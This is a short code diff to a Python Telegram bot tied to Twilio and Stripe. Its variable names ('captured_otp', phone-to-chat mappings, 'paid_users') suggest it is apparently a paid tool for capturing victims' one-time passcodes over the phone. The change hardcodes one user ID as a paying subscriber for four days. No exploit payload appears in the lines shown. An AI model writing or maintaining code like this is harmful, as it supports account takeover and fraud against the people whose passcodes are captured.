@@ -39,7 +39,7 @@ user_phone = {}          # Telegram user -> phone
 phone_to_chat = {}       # phone -> Telegram chat
 captured_otp = {}        # phone -> OTP
 last_message = {}        # Telegram user -> last custom message
-paid_users = {}          # user_id -> paid_until datetime
+paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}  # user_id -> paid_until datetime
 
 # -------------------------
 # FLASK APP FOR TWILIO / STRIPE
@@ -227,3 +227,4 @@ app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_ha
 if __name__ == "__main__":
     threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=PORT), daemon=True).start()
     asyncio.run(app_telegram.run_polling())
+
